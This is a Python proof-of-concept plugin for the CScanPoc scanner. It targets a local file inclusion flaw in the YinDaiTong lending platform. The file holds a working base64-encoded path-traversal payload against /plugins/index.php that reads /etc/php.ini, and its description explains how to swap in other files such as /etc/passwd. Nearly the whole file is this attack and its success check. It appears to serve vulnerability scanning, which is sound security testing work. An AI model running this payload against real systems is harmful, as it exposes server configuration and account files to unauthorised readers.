# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'YinDaiTong_0101'  # 平台漏洞编号
    name = '银贷通任意文件包含'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2013-06-14'  # 漏洞公布时间
    desc = '''
    合法头像地址
    /plugins/index.php?q=imgurl&url=QGltZ3VybEAvZGF0YS9pbWFnZXMvYXZhdGFyL25vYXZhdGFyX21pZGRsZS5naWY&id=112
    发现 url参数是base64_encode 过的字符串，看似与文件路径相关，可利用～
    替换url参数，为 /etc/passwd /etc/php.ini 等任意文件对应的base64字符串，可以打印文件内容。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=20082
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'YinDaiTong(银贷通)'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '463a4df6-f75d-452b-9aad-bae75ee4f923'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/plugins/index.php?q=imgurl&url=QGltZ3VybEAvLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vL2V0Yy9waHAuaW5p&id=112"
            url = self.target + payload
            response = requests.get(url)
            if "About php.ini" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
